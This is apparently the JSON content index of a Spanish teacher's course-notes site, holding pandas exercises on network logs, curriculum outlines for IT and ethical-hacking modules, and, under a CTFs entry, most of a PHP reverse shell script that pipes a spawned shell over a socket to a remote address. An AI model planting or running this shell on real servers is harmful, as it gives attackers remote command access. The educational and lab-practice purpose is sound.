aparici√≥n.\nImprime df_traffic_unique y verifica su tama√±o (.shape).\n\n# Aseg√∫rate de tener df_traffic definido\n \n# Encuentra duplicados aqu√≠\n \n# Elimina duplicados aqu√≠\n# df_traffic_unique = ...\n \n# Imprime el resultado\n \nParte 5: Agrupaci√≥n y Agregaci√≥n (.groupby())\nEjercicio 5.1: Agrupar y Contar\n\nUsando el DataFrame df_logs (del ejercicio 3.1):\n\nAgrupa los logs por ‚Äòusuario‚Äô y cuenta cu√°ntas acciones realiz√≥ cada uno (.size() o .count()).\nAgrupa los logs por ‚Äòaccion‚Äô y cuenta cu√°ntas veces ocurri√≥ cada acci√≥n.\nAgrupa los logs por ‚Äòip_origen‚Äô y cuenta cu√°ntas acciones provinieron de cada IP.\n\n\n\n# Escribe tu c√≥digo para el Ejercicio 5.1 aqu√≠\n# Aseg√∫rate de tener df_logs definido\ndata = {\n    &#039;timestamp&#039;: [&#039;2025-04-15 20:00:01&#039;, &#039;2025-04-15 20:01:15&#039;, &#039;2025-04-15 20:01:30&#039;, &#039;2025-04-15 20:02:05&#039;, &#039;2025-04-15 20:03:10&#039;],\n    &#039;usuario&#039;: [&#039;user1&#039;, &#039;admin&#039;, &#039;user1&#039;, &#039;guest&#039;, &#039;admin&#039;],\n    &#039;ip_origen&#039;: [&#039;192.168.1.10&#039;, &#039;10.0.0.5&#039;, &#039;192.168.1.10&#039;, &#039;203.0.113.1&#039;, &#039;10.0.0.5&#039;],\n    &#039;accion&#039;: [&#039;login_success&#039;, &#039;login_success&#039;, &#039;file_access&#039;, &#039;login_failed&#039;, &#039;logout&#039;]\n}\ndf_logs = pd.DataFrame(data)\n \n# Agrupa por usuario y cuenta\n \n# Agrupa por acci√≥n y cuenta\n \n# Agrupa por IP y cuenta\n \nEjercicio 5.2: Agrupar con M√∫ltiples Columnas\n\nUsando el DataFrame df_logs:\n\nAgrupa por ‚Äòusuario‚Äô y ‚Äòip_origen‚Äô simult√°neamente y cuenta las ocurrencias.\n\n\n\nParte 6: Visualizaci√≥n B√°sica\nEjercicio 6.1: Histograma\n\nUsando el DataFrame df_traffic (el original o el df_traffic_unique):\n\nCrea un histograma de la columna ‚Äòport‚Äô usando .plot(kind=&#039;hist&#039;) o plt.hist().\nA√±ade un t√≠tulo al gr√°fico.\n\n\n\n# Aseg√∫rate de tener df_traffic o df_traffic_unique definido\nplt.figure(figsize=(8, 4)) # Opcional: ajustar tama√±o\n \n# Crea el histograma aqu√≠\n \nplt.title(&#039;Distribuci√≥n de Puertos Utilizados&#039;)\nplt.xlabel(&#039;Puerto&#039;)\nplt.ylabel(&#039;Frecuencia&#039;)\nplt.show()\n \nEjercicio 6.2: Gr√°fico de Barras\n\nUsando el DataFrame df_logs:\n\nCalcula la cuenta de cada ‚Äòaccion‚Äô (puedes usar .value_counts() o .groupby().size()).\nCrea un gr√°fico de barras de las cuentas de acciones usando .plot(kind=&#039;bar&#039;).\nA√±ade un t√≠tulo y etiquetas a los ejes.\n\n\n\n# Aseg√∫rate de tener df_logs definido\nplt.figure(figsize=(8, 5))\n \n# Calcula las cuentas de acciones aqu√≠\n# action_counts = ...\n \n# Crea el gr√°fico de barras aqu√≠\n# action_counts.plot(kind=&#039;bar&#039;, ...) \n \nplt.title(&#039;N√∫mero de Ocurrencias por Acci√≥n&#039;)\nplt.xlabel(&#039;Acci√≥n&#039;)\nplt.ylabel(&#039;N√∫mero de Ocurrencias&#039;)\nplt.xticks(rotation=45) # Rotar etiquetas si son largas\nplt.tight_layout() # Ajustar layout\nplt.show()"},"Python--and--Machine-learning/Python-librer√≠as":{"title":"Python librer√≠as","links":[],"tags":[],"content":"\nGame Development\n\nPygame: Used for developing 2D games.\nPiglet: Used for developing cross-platform games.\n\n\nMachine Learning\n\nTensorFlow: Used for building AI models, neural networks, and machine learning applications.\nPyTorch: Used for building AI models, neural networks, and machine learning applications.\nScikit-learn: Used for building AI models, neural networks, and machine learning applications.\nPyBrain: Used for building AI models, neural networks, and machine learning applications.\nTheano: Used for building AI models, neural networks, and machine learning applications.\n\n\nGUI Development\n\nTkinter: Used for creating graphical user interfaces.\nPyQt: Used for creating graphical user interfaces.\n\n\nComputer Vision\n\nOpenCV: Used for image and object recognition, facial recognition, and augmented reality.\n\n\nData Science\n\nNumPy: Used for numerical computing.\nPandas: Used for data manipulation.\nSciPy: Used for scientific calculations.\n\n\nWeb Development\n\nBeautiful Soup: Used for web scraping.\nMechanical Soup: Used for web scraping.\nSelenium: Used for web scraping.\nScrapy: Used for web scraping.\nDjango: Used for building websites and APIs.\nFlask: Used for building websites and APIs.\nFast API: Used for building websites and APIs.\n\n\nData Visualization\n\nMatplotlib: Used for creating charts, graphs, and plots.\nSeaborn: Used for creating charts, graphs, and plots.\nPlotly: Used for creating charts, graphs, and plots.\n\n\nDatabase Management\n\nSQLite: Used for creating and managing databases.\nSQLAlchemy: Used for creating and managing databases.\n\n\nImage Processing\n\nPillow: Used for image manipulation and editing.\n\n\nNatural Language Processing\n\nNLTK: Used for processing and analyzing human language.\nSpaCy: Used for processing and analyzing human language.\n\n\nOther Utilities\n\nSymPy: Used for symbolic math.\nPickle: Used for object serialization.\nTurtle: Used for drawing.\nPyWin32: Used for interacting with the Windows OS.\n\n\n"},"SMR/Aplicaciones-web/index":{"title":"index","links":[],"tags":[],"content":"Texto"},"SMR/Aplicaciones-web/ra-criterios-contenidos-practicas":{"title":"ra-criterios-contenidos-practicas","links":[],"tags":[],"content":"Introducci√≥n a Python: tryhackme.com/r/room/pythonbasics"},"SMR/Redes-locales/index":{"title":"index","links":[],"tags":[],"content":"En primer lugar vamos a analizar los resultados de aprendizaje, criterios de evaluaci√≥n, contenidos y posibles enlaces a las pr√°cticas a realizar:"},"SMR/Redes-locales/ra-criterios-contenidos-practicas":{"title":"ra-criterios-contenidos-practicas","links":[],"tags":[],"content":"Introducci√≥n a Linux: tryhackme.com/r/room/linuxfundamentalspart1\nIntro a redes: tryhackme.com/r/room/whatisnetworking"},"SMR/Seguridad-inform√°tica/index":{"title":"index","links":[],"tags":[],"content":"En primer lugar vamos a analizar los resultados de aprendizaje, criterios de evaluaci√≥n, contenidos y posibles enlaces a las pr√°cticas a realizar:"},"SMR/Seguridad-inform√°tica/ra-criterios-contenidos-practicas":{"title":"ra-criterios-contenidos-practicas","links":[],"tags":[],"content":"RA - Criterios - Contenidos - Pr√°cticas\nRA 1. Aplica medidas de seguridad pasiva en sistemas inform√°ticos describiendo caracter√≠sticas de entornos y relacion√°ndolas con sus necesidades.\nCriterios de evaluaci√≥n:\na) Se ha valorado la importancia de mantener la informaci√≥n segura.\n\nContenido asociado: C 1.1 - Seguridad inform√°tica. Clasificaci√≥n, t√©cnicas y pr√°cticas de tratamiento seguro de la informaci√≥n.\n\nPr√°cticas:\n\ntryhackme.com/r/room/careersincyber\ntryhackme.com/r/room/securityprinciples\n\nb) Se han descrito las diferencias entre seguridad f√≠sica y l√≥gica.\nc) Se han definido las caracter√≠sticas de la ubicaci√≥n f√≠sica y condiciones ambientales de los equipos y servidores.\n\nContenido asociado: C 1.2 - Ubicaci√≥n y protecci√≥n f√≠sica de los equipos y servidores.\n\nd) Se ha identificado la necesidad de proteger f√≠sicamente los sistemas inform√°ticos.\ne) Se ha verificado el funcionamiento de los sistemas de alimentaci√≥n ininterrumpida.\n\nContenido asociado: C 1.3 - Sistemas de alimentaci√≥n ininterrumpida.\n\nf) Se han seleccionado los puntos de aplicaci√≥n de los sistemas de alimentaci√≥n ininterrumpida.\ng) Se han esquematizado las caracter√≠sticas de una pol√≠tica de seguridad basada en listas de control de acceso.\nh) Se ha valorado la importancia de establecer una pol√≠tica de contrase√±as.\ni) Se han valorado las ventajas que supone la utilizaci√≥n de sistemas biom√©tricos.\nRA 2. Gestiona dispositivos de almacenamiento describiendo los procedimientos efectuados y aplicando t√©cnicas para asegurar la integridad de la informaci√≥n.\nCriterios de evaluaci√≥n\na) Se ha interpretado la documentaci√≥n t√©cnica relativa a la pol√≠tica de almacenamiento.\n\nContenido asociado: C 2.7 - Pol√≠tica de almacenamiento.\n\nb) Se han tenido en cuenta factores inherentes al almacenamiento de la informaci√≥n (rendimiento, disponibilidad, accesibilidad, entre otros).\n\nContenido asociado: C 2.1 - Almacenamiento de la informaci√≥n: rendimiento, disponibilidad, accesibilidad.\nContenido asociado: C 2.4 - Criptograf√≠a.\n\nc) Se han clasificado y enumerado los principales m√©todos de almacenamiento incluidos los sistemas de almacenamiento en red.\nd) Se han descrito las tecnolog√≠as de almacenamiento redundante y distribuido.\n\nContenido asociado: C 2.2 - Almacenamiento redundante y distribuido.\n\ne) Se han seleccionado estrategias para la realizaci√≥n de copias de seguridad.\n\nContenido asociado: C 2.5 - Copias de seguridad e im√°genes de respaldo.\n\nf) Se ha tenido en cuenta la frecuencia y el esquema de rotaci√≥n.\ng) Se han realizado copias de seguridad con distintas estrategias.\nh) Se han identificado las caracter√≠sticas de los medios de almacenamiento remotos y extra√≠bles.\n\nContenido asociado: C 2.6 - Medios de almacenamiento.\n\ni) Se han utilizado medios de almacenamiento remotos y extra√≠bles.\n\nContenido asociado: C 2.3 - Almacenamiento remoto y extra√≠ble.\n\nj) Se han creado y restaurado im√°genes de respaldo de sistemas en funcionamiento.\n\nContenido asociado: C 2.8 - Recuperaci√≥n de datos\n\nRA 3. Aplica mecanismos de seguridad activa describiendo sus caracter√≠sticas y relacion√°ndolas con las necesidades de uso del sistema inform√°tico.\nCriterios de evaluaci√≥n\na) Se han seguido planes de contingencia para actuar ante fallos de seguridad.\n\nContenido asociado: C 3.5 - Utilizaci√≥n de cortafuegos en un sistema o servidor.\nContenido asociado: C 3.4 - Seguridad en los protocolos para comunicaciones inal√°mbricas.\nContenido asociado: C 3.6 - Listas de control de acceso.\nContenido asociado: C 3.7 - Pol√≠tica de contrase√±as.\n\nb) Se han clasificado los principales tipos de software malicioso.\n\nContenido asociado: C 3.9 - Software malicioso. Clasificaci√≥n, protecci√≥n y desinfecci√≥n.\n\nPr√°cticas\n\nAtaques comunes: tryhackme.com/r/room/commonattacks\n\nc) Se han realizado actualizaciones peri√≥dicas de los sistemas para corregir posibles vulnerabilidades.\n\nContenido asociado: C 3.10 - Auditorias de seguridad.\nContenido asociado: C 3.11 - Actualizaci√≥n de sistemas y aplicaciones.\n\nd) Se ha verificado el origen y la autenticidad de las aplicaciones que se instalan en los sistemas.\n\nContenido asociado: C 3.1 - Identificaci√≥n digital.\nContenido asociado: C 3.2 - Sistemas biom√©tricos de identificaci√≥n.\nContenido asociado: C 3.3 - Firma electr√≥nica y certificado digital.\n\ne) Se han instalado, probado y actualizado aplicaciones espec√≠ficas para la detecci√≥n y eliminaci√≥n de software malicioso.\n\nContenido asociado: C 3.5 - Utilizaci√≥n de cortafuegos en un sistema o servidor.\n\nf) Se han aplicado t√©cnicas de recuperaci√≥n de datos.\n\nContenido asociado: C 3.8 - Recuperaci√≥n de datos.\n\nRA 4. Asegura la privacidad de la informaci√≥n transmitida en redes inform√°ticas describiendo vulnerabilidades e instalando software espec√≠fico.\nCriterios de evaluaci√≥n\na) Se ha identificado la necesidad de inventariar y controlar los servicios de red.\nb) Se ha contrastado la incidencia de las t√©cnicas de ingenier√≠a social en los fraudes inform√°ticos y robos de informaci√≥n.\n\nContenido asociado: C 4.2 - Fraudes inform√°ticos y robos de informaci√≥n.\n\nc) Se ha deducido la importancia de minimizar el volumen de tr√°fico generado por la publicidad y el correo no deseado.\n\nContenido asociado: C 4.7 - Publicidad y correo no deseado.\n\nd) Se han aplicado medidas para evitar la monitorizaci√≥n de redes cableadas.\n\nCotenido asociado: C 4.3 - Control de la monitorizaci√≥n en redes cableadas.\n\ne) Se han clasificado y valorado las propiedades de seguridad de los protocolos usados en redes inal√°mbricas.\n\nContenido asociado: C 4.4 - Seguridad en redes inal√°mbricas.\n\nPr√°cticas:\n\nWifi: tryhackme.com/r/room/wifihacking101\n\nf) Se han descrito sistemas de identificaci√≥n como la firma electr√≥nica, certificado digital, entre otros.\n\nContenido asociado: C 4.1 - M√©todos para asegurar la privacidad de la informaci√≥n transmitida.\n\ng) Se han utilizado sistemas de identificaci√≥n como la firma electr√≥nica, certificado digital, entre otros.\n\nContenido asociado: C 4.5 - Sistemas de identificaci√≥n: firma electr√≥nica, certificados digitales y otros.\n\nh) Se ha instalado y configurado un cortafuegos en un equipo o servidor.\n\nContenido asociado: C 4.6 - Cortafuegos en equipos y servidores.\n\nRA 5. Reconoce la legislaci√≥n y normativa sobre seguridad y protecci√≥n de datos analizando las repercusiones de su incumplimiento.\nCriterios de evaluaci√≥n\na) Se ha descrito la legislaci√≥n sobre protecci√≥n de datos de car√°cter personal.\n\nContenido asociado: C 5.1 - Legislaci√≥n sobre protecci√≥n de datos.\n\nb) Se ha determinado la necesidad de controlar el acceso a la informaci√≥n personal almacenada.\nc) Se han identificado las figuras legales que intervienen en el tratamiento y mantenimiento de los ficheros de datos.\nd) Se ha contrastado la obligaci√≥n de poner a disposici√≥n de las personas los datos personales que les conciernen.\ne) Se ha descrito la legislaci√≥n actual sobre los servicios de la sociedad de la informaci√≥n y comercio electr√≥nico.\n\nContenido asociado: C 5.2 - Legislaci√≥n sobre los servicios de la sociedad de la informaci√≥n y correo electr√≥nico.\n\nf) Se han contrastado las normas sobre gesti√≥n de seguridad de la informaci√≥n.\nPr√°cticas:\n\ntryhackme.com/r/room/cybergovernanceregulation\n"},"SMR/Servicios-en-red/index":{"title":"index","links":[],"tags":[],"content":"En primer lugar vamos a analizar los resultados de aprendizaje, criterios de evaluaci√≥n, contenidos y posibles enlaces a las pr√°cticas a realizar:"},"SMR/Servicios-en-red/ra-criterios-contenidos-practicas":{"title":"ra-criterios-contenidos-practicas","links":[],"tags":[],"content":"Introducci√≥n a Linux: tryhackme.com/r/room/linuxfundamentalspart1\nIntro a redes: tryhackme.com/r/room/whatisnetworking\nContinuamos con redes: tryhackme.com/r/room/networkservices"},"SMR/index":{"title":"SMR","links":["SMR/Aplicaciones-web/","SMR/Seguridad-inform√°tica/","SMR/Redes-locales/","SMR/Servicios-en-red/"],"tags":["SMR","Apuntes"],"content":"\n\n                  \n                  Warning\n                  \n                \n\nEsto es un trabajo en curso. A√∫n en una fase alfa.\n\n\nMateriales preparados para el Ciclo Formativo de Grado Medio de Sistemas Microinform√°ticos y Redes (SMR)\nInformaci√≥n:\n\nwww.todofp.es/que-estudiar/familias-profesionales/informatica-comunicaciones/sistemas-microniformaticos-redes.html\n\nTemario de cada m√≥dulo profesional:\n\nAplicaciones Web: AWeb\nSeguridad Inform√°tica: SI\nRedes Locales: RL\nServicios en Red: SRed\n"},"about/Sobre-el-proyecto":{"title":"Sobre el proyecto","links":[],"tags":[],"content":"Sobre el proyecto\nQu√© es este proyecto\nEsta p√°gina web nace con la idea de generar una documentaci√≥n de m√≥dulos profesionales de FP. Buscando el objetivo de que est√© online el mayor tiempo posible, est√° desplegado en distintos sistemas:\n\nDesplegado a trav√©s de Github pages en: rafaeldelrio.github.io\nDesplegado a trav√©s de Cloudflare pages en: web.cloudflare-nbkeq.workers.dev/\nDesplegado a trav√©s de Gitlab pages en: web-dcb01e.gitlab.io/\n\nA qui√©n va dirigido\nEste proyecto ha sido creado con el prop√≥sito, en primer lugar, de ser √∫til para m√≠ mismo. Es decir, que con el buscador avanzado de la web se pueda encontrar f√°cilmente informaci√≥n relevante, apuntes, ejemplos de uso‚Ä¶\nAdem√°s el proyecto va dirigido a cualquiera que tenga curiosidad sobre estos temas.\nC√≥mo puedo acceder al proyecto\nComo comentaba anteriormente, se puede acceder al proyecto directamente empleando la url: rafaeldelrio.github.io\nEl c√≥digo fuente de todo lo documentado se encuentra en: github.com/RafaeldelRio/rafaeldelrio.github.io\nMe interesa, me gustar√≠a crear algo parecido para m√≠\nLa documentaci√≥n del proyecto ha sido creada con Obsidian. Son archivos markdown (.md).\nEstos archivos han sido desplegados empleando el proyecto Quartz.\nEl despliegue est√° hecho mediante github actions y github pages.\nSe puede seguir un tutorial paso a paso en la siguiente web:\nTutorial para desplegar el proyecto\nSobre m√≠\nEl impulsor de este proyecto es Rafael del R√≠o, profesor de inform√°tica. Si tienes ideas, sugerencias o alg√∫n motivo por el que quieras contactarme, no lo dudes, y m√°ndame un mensaje a trav√©s de Github.\n\ngithub.com/RafaeldelRio\n"},"about/index":{"title":"index","links":[],"tags":[],"content":"Sobre el proyecto\nQu√© es este proyecto\nEsta p√°gina web nace con la idea de generar una documentaci√≥n de m√≥dulos profesionales de FP. Buscando el objetivo de que est√© online el mayor tiempo posible, est√° desplegado en distintos sistemas:\n\nDesplegado a trav√©s de Github pages en: rafaeldelrio.github.io\nDesplegado a trav√©s de Cloudflare pages en: web.cloudflare-nbkeq.workers.dev/\nDesplegado a trav√©s de Gitlab pages en: web-dcb01e.gitlab.io/\n\nA qui√©n va dirigido\nEste proyecto ha sido creado con el prop√≥sito, en primer lugar, de ser √∫til para m√≠ mismo. Es decir, que con el buscador avanzado de la web se pueda encontrar f√°cilmente informaci√≥n relevante, apuntes, ejemplos de uso‚Ä¶\nAdem√°s el proyecto va dirigido a cualquiera que tenga curiosidad sobre estos temas.\nC√≥mo puedo acceder al proyecto\nComo comentaba anteriormente, se puede acceder al proyecto directamente empleando la url: rafaeldelrio.github.io\nEl c√≥digo fuente de todo lo documentado se encuentra en: github.com/RafaeldelRio/rafaeldelrio.github.io\nMe interesa, me gustar√≠a crear algo parecido para m√≠\nLa documentaci√≥n del proyecto ha sido creada con Obsidian. Son archivos markdown (.md).\nEstos archivos han sido desplegados empleando el proyecto Quartz.\nEl despliegue est√° hecho mediante github actions y github pages.\nSe puede seguir un tutorial paso a paso en la siguiente web:\nTutorial para desplegar el proyecto\nSobre m√≠\nEl impulsor de este proyecto es Rafael del R√≠o, profesor de inform√°tica. Si tienes ideas, sugerencias o alg√∫n motivo por el que quieras contactarme, no lo dudes, y m√°ndame un mensaje a trav√©s de Github.\n\ngithub.com/RafaeldelRio\n"},"ceti/Hacking-√©tico/CTFs/php-reverse-shell.php":{"title":"php-reverse-shell.php","links":[],"tags":[],"content":" array(&quot;pipe&quot;, &quot;r&quot;),  // stdin is a pipe that the child will read from\n   1 =&gt; array(&quot;pipe&quot;, &quot;w&quot;),  // stdout is a pipe that the child will write to\n   2 =&gt; array(&quot;pipe&quot;, &quot;w&quot;)   // stderr is a pipe that the child will write to\n);\n\n$process = proc_open($shell, $descriptorspec, $pipes);\n\nif (!is_resource($process)) {\n\tprintit(&quot;ERROR: Can&#039;t spawn shell&quot;);\n\texit(1);\n}\n\n// Set everything to non-blocking\n// Reason: Occsionally reads will block, even though stream_select tells us they won&#039;t\nstream_set_blocking($pipes[0], 0);\nstream_set_blocking($pipes[1], 0);\nstream_set_blocking($pipes[2], 0);\nstream_set_blocking($sock, 0);\n\nprintit(&quot;Successfully opened reverse shell to $ip:$port&quot;);\n\nwhile (1) {\n\t// Check for end of TCP connection\n\tif (feof($sock)) {\n\t\tprintit(&quot;ERROR: Shell connection terminated&quot;);\n\t\tbreak;\n\t}\n\n\t// Check for end of STDOUT\n\tif (feof($pipes[1])) {\n\t\tprintit(&quot;ERROR: Shell process terminated&quot;);\n\t\tbreak;\n\t}\n\n\t// Wait until a command is end down $sock, or some\n\t// command output is available on STDOUT or STDERR\n\t$read_a = array($sock, $pipes[1], $pipes[2]);\n\t$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\n\n\t// If we can read from the TCP socket, send\n\t// data to process&#039;s STDIN\n\tif (in_array($sock, $read_a)) {\n\t\tif ($debug) printit(&quot;SOCK READ&quot;);\n\t\t$input = fread($sock, $chunk_size);\n\t\tif ($debug) printit(&quot;SOCK: $input&quot;);\n\t\tfwrite($pipes[0], $input);\n\t}\n\n\t// If we can read from the process&#039;s STDOUT\n\t// send data down tcp connection\n\tif (in_array($pipes[1], $read_a)) {\n\t\tif ($debug) printit(&quot;STDOUT READ&quot;);\n\t\t$input = fread($pipes[1], $chunk_size);\n\t\tif ($debug) printit(&quot;STDOUT: $input&quot;);\n\t\tfwrite($sock, $input);\n\t}\n\n\t// If we can read from the process&#039;s STDERR\n\t// send data down tcp connection\n\tif (in_array($pipes[2], $read_a)) {\n\t\tif ($debug) printit(&quot;STDERR READ&quot;);\n\t\t$input = fread($pipes[2], $chunk_size);\n\t\tif ($debug) printit(&quot;STDERR: $input&quot;);\n\t\tfwrite($sock, $input);\n\t}\n}\n\nfclose($sock);\nfclose($pipes[0]);\nfclose($pipes[1]);\nfclose($pipes[2]);\nproc_close($process);\n\n// Like print, but does nothing if we&#039;ve daemonised ourself\n// (I can&#039;t figure out how to redirect STDOUT like a proper daemon)\nfunction printit ($string) {\n\tif (!$daemon) {\n\t\tprint &quot;$string\\n&quot;;\n\t}\n}\n\n?&gt;"},"ceti/Hacking-√©tico/RA-1/1a---Elementos-esenciales-del-hacking-√©tico":{"title":"1a - Elementos esenciales del hacking √©tico","links":[],"tags":[],"content":"Criterio de evaluaci√≥n:\na) Se ha definido la terminolog√≠a esencial del hacking √©tico.\n\nContenido asociado: Elementos esenciales del hacking √©tico.\n\nConceptos\n\nDefinici√≥n de hacking √©tico y su rol en ciberseguridad\nT√©rminos clave: white hat, black hat, grey hat, test de penetraci√≥n (pentest), evaluaci√≥n de vulnerabilidades.\nObjetivos de hacking √©tico.\n\nPr√°cticas\n\nCarreras de ciber: tryhackme.com/r/room/careersincyber\nIntro a Linux: tryhackme.com/r/room/linuxfundamentalspart1\nCrear un glosario de t√©rminos de hacking y definiciones de ejemplo\nDiscusi√≥n en grupo: diferencia entre hacking (programas de bug bounty, por ejemplo) y cracking.\n\nMateriales\n\nOWASP Glossary: cheatsheetseries.owasp.org/Glossary.html\nNIST Cybersecurity Framework\n\nEvaluaci√≥n\n\nTest de terminolog√≠a.\n"},"ceti/Hacking-√©tico/RA-1/1b---Conceptos-√©ticos-y-legales":{"title":"1b - Conceptos √©ticos y legales","links":[],"tags":[],"content":"Criterio de evaluaci√≥n:\nb) Se han identificado los conceptos √©ticos y legales frente al ciberdelito.\n\nContenido asociado: Diferencias entre hacking, hacking √©tico, tests de penetraci√≥n y hacktivismo.\n\nConceptos\n\nDiferencias entre hacking, hacking √©tico, tests de penetraci√≥n y hacktivismo.\nFrameworks legales: GDPR, LOPDGDD, LSSI, C√≥digo penal‚Ä¶\nMostrar las consecuencias del hacking no √©tico (penas, da√±o reputacional‚Ä¶).\nComentar el rol de las certificaciones (como CEH, eJPT, OSCP) para establecer credibilidad.\n\nPr√°cticas\n\nComparar hacking √©tico (programas de bug bounty) con hacktivismo (anonymous).\nRole-play: simular una reuni√≥n con clientes sobre los l√≠mites √©ticos y legales de un pentest\nHacer un borrador de ejemplo de los acuerdos de un pentest.\n\nMateriales\n\nPlantillas de SANS Institute o EC-Council\nRecursos de estudio de Bugcrowd o HackerOne\n\nEvaluaci√≥n\n\n\n"},"ceti/Hacking-√©tico/RA-1/1c---Alcance-y-condiciones-de-un-pentest":{"title":"1c - Alcance y condiciones de un pentest","links":[],"tags":[],"content":"Criterio de evaluaci√≥n:\nc) Se ha definido el alcance y condiciones de un test de intrusi√≥n.\n\nContenido asociado: Recolecci√≥n de permisos y autorizaciones previos a un test de intrusi√≥n.\n\nConceptos\n\nTipos de test de intrusi√≥n (internos, externos, ciegos, dirigidos)\nDocumentaci√≥n necesaria: acuerdos de confidencialidad, alcance, metodolog√≠as\nGesti√≥n de riesgos durante un test de intrusi√≥n\nLimitaciones legales y √©ticas\n\nPr√°cticas\n\nRedactar un documento de alcance (scoping) para un test de intrusi√≥n\nSimulaci√≥n de reuni√≥n con cliente para definir objetivos y l√≠mites\nElaboraci√≥n de un calendario de pruebas con safe harbor\n\nMateriales\nEvaluaci√≥n"},"ceti/Hacking-√©tico/RA-1/1d---Principios-de-seguridad":{"title":"1d - Principios de seguridad","links":[],"tags":[],"content":"Criterio de evaluaci√≥n:\nd) Se han identificado los elementos esenciales de seguridad: confidencialidad, autenticidad, integridad y disponibilidad.\n\nContenido asociado: Auditor√≠as de caja negra y de caja blanca.\n\nConceptos\n\nPrincipios CIA (Confidencialidad, Integridad y Disponibilidad)\nAutenticaci√≥n vs Autorizaci√≥n\nAutenticidad y no repudio\nDiferencias entre auditor√≠as de caja negra, gris y blanca\nMetodolog√≠as de evaluaci√≥n de seguridad\n\nPr√°cticas\n\nPrincipios de seguridad: tryhackme.com/r/room/securityprinciples\nAn√°lisis comparativo de resultados entre test de caja negra y blanca\nSimulaci√≥n de ambos tipos de auditor√≠as en sistemas controlados\nEvaluaci√≥n de un sistema bajo los principios CIA\n\nMateriales\n\nFrameworks de evaluaci√≥n de seguridad (NIST, ISO 27001)\nHerramientas de documentaci√≥n de hallazgos\n\nEvaluaci√≥n"},"ceti/Hacking-√©tico/RA-1/1e---Fases-del-hacking":{"title":"1e - Fases del hacking","links":[],"tags":[],"content":"Criterio de evaluaci√≥n:\ne) Se han identificado las fases de un ataque seguidas por un atacante.\n\nContenido asociado: Fases del hacking.\n\nPr√°cticas:\n\ntryhackme.com/r/room/cyberkillchainzmt\n\nConceptos\n\nCiclo de vida de un ataque: reconocimiento, escaneo, obtenci√≥n de acceso, mantenimiento del acceso, borrado de huellas\nKill Chain de Lockheed Martin\nFramework MITRE ATT&amp;CK\nT√°cticas, t√©cnicas y procedimientos (TTPs)\n\nPr√°cticas\n\nDocumentar cada fase de un ataque en un entorno controlado\nMapear un ataque simulado con el framework MITRE ATT&amp;CK\nEjercicio pr√°ctico siguiendo todas las fases en un laboratorio\n\nMateriales\n\nMITRE Navigator para visualizar t√©cnicas de ataque\nHerramientas espec√≠ficas para cada fase del ataque\n\nEvaluaci√≥n"},"ceti/Hacking-√©tico/RA-1/1f---An√°lisis-de-vulnerabilidades":{"title":"1f - An√°lisis de vulnerabilidades","links":[],"tags":[],"content":"Criterio de evaluaci√≥n:\nf) Se han analizado y definido los tipos vulnerabilidades.\n\nContenido asociado: Documentaci√≥n de vulnerabilidades.\n\nConceptos\n\nClasificaci√≥n OWASP de vulnerabilidades\nSistema de puntuaci√≥n CVSS\nBase de datos CVE y NVD\nCategor√≠as principales: inyecci√≥n, XSS, CSRF, configuraciones inseguras\n\nPr√°cticas\n\nAn√°lisis y calificaci√≥n de vulnerabilidades seg√∫n CVSS\nB√∫squeda e investigaci√≥n de CVEs recientes\nCreaci√≥n de una base de datos de vulnerabilidades clasificadas\n\nMateriales\n\nBase de datos CVE/NVD\nCalculadora CVSS\nPlataformas de vulnerabilidades como Vulnhub, DVWA\n\nEvaluaci√≥n"},"ceti/Hacking-√©tico/RA-1/1g---An√°lisis-de-tipos-de-ataques":{"title":"1g - An√°lisis de tipos de ataques","links":[],"tags":[],"content":"Criterio de evaluaci√≥n:\ng) Se han analizado y definido los tipos de ataque.\n\nContenido asociado: ClearNet, Deep Web, Dark Web, Darknets. Conocimiento, diferencias y herramientas de acceso: Tor. ZeroNet, FreeNet.\n\nPr√°cticas\n\ntryhackme.com/r/room/commonattacks\n\nConceptos\n\nClasificaci√≥n de ataques: pasivos vs activos\nAtaques de ingenier√≠a social, denegaci√≥n de servicio, man-in-the-middle\nFuncionamiento de darknets y diferencias con internet visible\nPrivacidad, anonimato y criptograf√≠a en redes oscuras\n\nPr√°cticas\n\nInstalaci√≥n y configuraci√≥n segura de navegadores para la Dark Web\nAn√°lisis de mercados en la Dark Web (enfoque educativo)\nEjercicio de an√°lisis de riesgos en diferentes tipos de redes\n\nMateriales\n\nTor Browser, configuraci√≥n para m√°xima privacidad\nI2P, Freenet, ZeroNet (an√°lisis comparativo)\nHerramientas de an√°lisis de tr√°fico cifrado\n\nEvaluaci√≥n"},"ceti/Hacking-√©tico/RA-1/1h---Caracterizaci√≥n-de-vulnerabilidades":{"title":"1h - Caracterizaci√≥n de vulnerabilidades","links":[],"tags":[],"content":"Criterio de evaluaci√≥n:\nh) Se han determinado y caracterizado las diferentes vulnerabilidades existentes.\nConceptos\n\nDebilidades de dise√±o vs implementaci√≥n\nErrores comunes en desarrollo seguro\nVulnerabilidades de d√≠a cero vs conocidas\nVectores de ataque emergentes\n\nPr√°cticas\n\nCrear un cat√°logo de vulnerabilidades en diferentes plataformas\nAn√°lisis de parches de seguridad publicados recientemente\nDesarrollo de pruebas de concepto para vulnerabilidades conocidas\n\nMateriales\n\nExploit-DB y searchsploit\nBases de datos de vulnerabilidades como VulnDB, Mitre\nPlataformas de CTF para practicar la identificaci√≥n de vulnerabilidades\n\nEvaluaci√≥n"},"ceti/Hacking-√©tico/RA-1/1i---Herramientas-de-monitorizaci√≥n-y-hacking":{"title":"1i - Herramientas de monitorizaci√≥n y hacking","links":[],"tags":[],"content":"Criterio de evaluaci√≥n:\ni) Se han determinado las herramientas de monitorizaci√≥n disponibles en el mercado adecuadas en funci√≥n del tipo de organizaci√≥n.\n\nContenido asociado: Clasificaci√≥n de herramientas de seguridad y hacking.\n\nConceptos\n\nClasificaci√≥n de herramientas seg√∫n su funcionalidad\nSoluciones comerciales vs open source\nCriterios de selecci√≥n seg√∫n el tipo de organizaci√≥n\nConsideraciones de escalabilidad y rendimiento\n\nPr√°cticas\n\nComparativa de herramientas de monitorizaci√≥n (SIEM, IDS/IPS)\nImplementaci√≥n de un sistema de monitorizaci√≥n b√°sico\nAn√°lisis de casos de uso espec√≠ficos seg√∫n el tipo de organizaci√≥n\n\nMateriales\n\nSIEM: Splunk, ELK Stack, Wazuh\nIDS/IPS: Snort, Suricata, Zeek\nVulnerability scanners: Nessus, OpenVAS, Nexpose\n\nEvaluaci√≥n"},"ceti/Hacking-√©tico/RA-2/2a---Funcionamiento-de-las-tarjetas-de-red-inal√°mbricas":{"title":"2a - Funcionamiento de las tarjetas de red 